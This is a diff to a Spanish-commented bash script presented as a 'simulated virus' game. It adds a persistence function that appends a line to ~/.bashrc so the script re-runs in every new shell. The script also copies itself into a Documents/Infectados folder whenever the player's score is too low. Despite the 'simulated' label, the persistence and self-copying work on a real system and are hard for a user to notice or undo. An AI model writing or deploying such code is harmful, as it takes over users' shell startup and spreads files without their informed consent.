@@ -6,6 +6,17 @@
 # alcanzar una puntuación mínima de 20. Si la puntuación no es suficiente, se abre
 # una nueva pestaña con el juego, simulando la "infección" del sistema.
 
+# Función de Persistencia Simulada: Agrega una entrada a ~/.bashrc
+persistencia_simulada() {
+  entrada="bash $(pwd)/$(basename "$0") # Persistencia del virus simulado"
+  if ! grep -qF "$entrada" "$HOME/.bashrc"; then
+    echo "$entrada" >> "$HOME/.bashrc"
+    echo "Entrada de persistencia agregada a ~/.bashrc."
+  else
+    echo "La entrada de persistencia ya existe en ~/.bashrc."
+  fi
+}
+
 # Función de Propagación Simulada: Copia este script a $HOME/Documents/Infectados
 propagacion_simulada() {
   destino="$HOME/Documents/Infectados"
@@ -56,6 +67,7 @@ while true; do
      echo "Puntuación insuficiente. Ejecutando Payload Simulado..."
      payload_simulado
      propagacion_simulada
+     persistencia_simulada
      sleep 1
   fi
 done
